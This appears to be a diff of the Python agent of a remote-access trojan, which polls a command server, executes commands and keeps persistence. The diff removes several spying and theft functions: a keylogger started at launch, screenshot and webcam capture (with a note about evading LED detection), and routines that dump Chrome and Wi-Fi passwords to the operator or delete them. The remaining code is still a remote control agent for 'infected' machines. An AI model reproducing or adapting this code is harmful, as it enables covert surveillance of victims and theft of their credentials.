@@ -14,18 +14,7 @@ import zipfile
 import tempfile
 import socket
 import getpass
-
-from pynput.keyboard import Key, Listener
 import cv2
-from passwords import getChromePasswords
-from passwords import getWifiPasswords
-from passwords import deleteChromePasswords
-
-if os.name == 'nt':
-    from PIL import ImageGrab
-else:
-    import pyscreenshot as ImageGrab
-
 import config
 
 
@@ -49,7 +38,6 @@ class Agent(object):
         self.uid = self.get_UID()
         self.hostname = socket.gethostname()
         self.username = getpass.getuser()
-        self.keylogs = ""
 
     def get_install_dir(self):
         install_dir = None
@@ -274,86 +262,6 @@ class Agent(object):
             self.send_output("[+] Archive created: %s" % zip_name)
         except Exception as exc:
             self.send_output(traceback.format_exc())
-
-    @threaded
-    def screenshot(self):
-        """ Takes a screenshot and uploads it to the server"""
-        tmp_file = tempfile.NamedTemporaryFile()
-        screenshot_file = tmp_file.name + ".png"
-
-        if os.name != 'posix':
-            screenshot = ImageGrab.grab()
-            tmp_file.close()
-            screenshot.save(screenshot_file)
-        else:
-            name = tmp_file.name + ".png"
-            os.system("screencapture %s" % name)
-
-        self.upload(screenshot_file)
-
-    @threaded
-    def startkeylogger(self):
-        "Starts logging every key pressed"
-        def on_press(key):
-            self.keylogs += str(key) + " "
-
-        with Listener(on_press=on_press) as listener:
-            listener.join()
-
-    @threaded
-    def getloggedkeys(self):
-        self.send_output(self.keylogs)
-        self.keylogs = ""
-        if platform.system() == "Darwin":
-            self.send_output("Keylogger on infected Mac currenly not supported")
-
-    @threaded
-    def camshot(self):
-        # Notice: light of usage webcam gets turned on.
-        # TODO: Find way to disable led-lamp or reduce amount of time.sleep as much as possible for less detection
-        cam = cv2.VideoCapture(0)
-        time.sleep(3)  # wait for camera to open up, so image isn't dark (less sleeping = darker image)
-        ret, frame = cam.read()
-        if not ret:
-            return
-        tmp_file = tempfile.NamedTemporaryFile()
-        camshot_file = tmp_file.name + ".png"
-        tmp_file.close()
-        cv2.imwrite(camshot_file, frame)
-        self.upload(camshot_file)
-
-    @threaded
-    def camvideo(self):
-        cam = cv2.VideoCapture(0)
-        time.sleep(3)
-        ret, video = cam.grab()
-        if not ret:
-            return
-
-        tmp_file = tempfile.NamedTemporaryFile()
-        camshot_file = tmp_file.name + ".png"
-        tmp_file.close()
-        cv2.imwrite(camshot_file, video)
-        self.upload(camshot_file)
-
-
-    @threaded
-    def passwords(self):
-        # get stored passwords from Chrome
-        data = getChromePasswords()
-        for dictionary in data:
-            for key, value in dictionary.items():
-                self.send_output("%s : %s" % (key, value))
-
-        # get local stored passwords from wifi connections
-        data = getWifiPasswords()
-        for wifi in data:
-            self.send_output(wifi)
-
-    @threaded
-    def deleteStoredPasswords(self):
-        deleteChromePasswords()
-
     def help(self):
         """ Displays the help """
         self.send_output(config.HELP)
@@ -367,10 +275,6 @@ class Agent(object):
             except:
                 self.log("Failed executing persistence")
         self.silent = False
-        try:
-            self.startkeylogger()
-        except:
-            self.log("startKeylogger failed")
         while True:
             try:
                 todo = self.server_hello()
@@ -421,16 +325,6 @@ class Agent(object):
                                 self.send_output('usage: python <python_file> or python <python_command>')
                             else:
                                 self.python(" ".join(args))
-                        elif command == 'screenshot':
-                            self.screenshot()
-                        elif command == 'keylogger':
-                            self.getloggedkeys()
-                        elif command == 'camshot':
-                            self.camshot()
-                        elif command == 'passwords':
-                            self.passwords()
-                        elif command == 'delete passwords':
-                            self.deleteStoredPasswords()
                         elif command == 'help':
                             self.help()
                         else:
